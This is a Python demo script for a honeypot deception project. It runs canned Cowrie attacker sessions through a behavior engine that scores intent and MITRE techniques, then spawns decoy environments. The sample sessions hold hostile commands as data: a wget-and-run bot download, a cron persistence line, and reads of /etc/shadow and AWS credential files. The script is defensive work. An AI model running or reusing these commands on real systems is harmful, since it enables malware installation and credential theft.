#!/usr/bin/env python3
"""Demo: full Week-3 + Week-4 flow on sample Cowrie sessions.

Runs the behavior engine over a few canned attacker sessions, prints the intent /
TTPs / threat score / profile for each, then spawns the personalized deception
environment the deception engine would deploy. Handy for the Week-6 demo video.

    python scripts/demo_w3_w4.py
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from behavior import BehaviorEngine
from behavior.features import parse_sessions
from deception import DeceptionEngine

SAMPLES = {
    "recon kiddie (185.x)": [
        {"eventid": "cowrie.session.connect", "session": "s1", "src_ip": "185.10.0.1"},
        {"eventid": "cowrie.login.success", "session": "s1", "src_ip": "185.10.0.1",
         "username": "root", "password": "root"},
        {"eventid": "cowrie.command.input", "session": "s1", "src_ip": "185.10.0.1",
         "input": "uname -a"},
        {"eventid": "cowrie.command.input", "session": "s1", "src_ip": "185.10.0.1",
         "input": "whoami"},
        {"eventid": "cowrie.session.closed", "session": "s1", "duration": 25.0},
    ],
    "mirai-style bot (192.x)": [
        {"eventid": "cowrie.session.connect", "session": "s2", "src_ip": "192.99.0.2"},
        {"eventid": "cowrie.login.success", "session": "s2", "src_ip": "192.99.0.2",
         "username": "admin", "password": "admin"},
        {"eventid": "cowrie.command.input", "session": "s2", "src_ip": "192.99.0.2",
         "input": "busybox wget http://192.99.0.2/bot -O bot; chmod +x bot; ./bot"},
        {"eventid": "cowrie.command.input", "session": "s2", "src_ip": "192.99.0.2",
         "input": "echo '* * * * * /tmp/bot' | crontab -"},
        {"eventid": "cowrie.session.file_download", "session": "s2", "src_ip": "192.99.0.2",
         "url": "http://192.99.0.2/bot"},
        {"eventid": "cowrie.session.closed", "session": "s2", "duration": 6.0},
    ],
    "hands-on operator (45.x)": [
        {"eventid": "cowrie.session.connect", "session": "s3", "src_ip": "45.9.0.3"},
        {"eventid": "cowrie.login.success", "session": "s3", "src_ip": "45.9.0.3",
         "username": "deploy", "password": "Sup3rS3cret!"},
        {"eventid": "cowrie.command.input", "session": "s3", "src_ip": "45.9.0.3",
         "input": "cat /etc/shadow"},
        {"eventid": "cowrie.command.input", "session": "s3", "src_ip": "45.9.0.3",
         "input": "cat /root/.aws/credentials"},
        {"eventid": "cowrie.command.input", "session": "s3", "src_ip": "45.9.0.3",
         "input": "ssh root@10.0.0.21"},
        {"eventid": "cowrie.session.closed", "session": "s3", "duration": 140.0},
    ],
}


def main():
    beng = BehaviorEngine()
    deng = DeceptionEngine(workdir=tempfile.mkdtemp(prefix="cadn-demo-"), dry_run=True)

    for label, events in SAMPLES.items():
        print("\n" + "=" * 64)
        print(f"ATTACKER: {label}")
        print("=" * 64)
        analyses = beng.analyze_events(events, persist=False)
        a = analyses[0]
        print(f"  intent        : {a.intent}  (conf {a.intent_confidence:.2f})")
        print(f"  threat score  : {a.threat_score}/100  ->  band: {a.band}")
        print(f"  MITRE TTPs    : {', '.join(t.technique_id for t in a.ttps) or '-'}")

        session = parse_sessions(events)[list(parse_sessions(events))[0]]
        env = DeceptionEngine.from_analysis(a, session=session, engine=deng)
        print(f"  -> deception  : tier='{env.tier}' template='{env.template_name}' "
              f"(spawned in {env.spawn_seconds*1000:.0f} ms)")
        print(f"     services   : {', '.join(f'{s.service}:{s.port}' for s in env.servers)}")
        print(f"     decoy files: {len(env.manifest)}  e.g. "
              f"{', '.join(sorted(env.manifest)[:4])}")

    print("\n" + "=" * 64)
    print(f"active deception environments: {len(deng.get_active_environments())}")


if __name__ == "__main__":
    main()
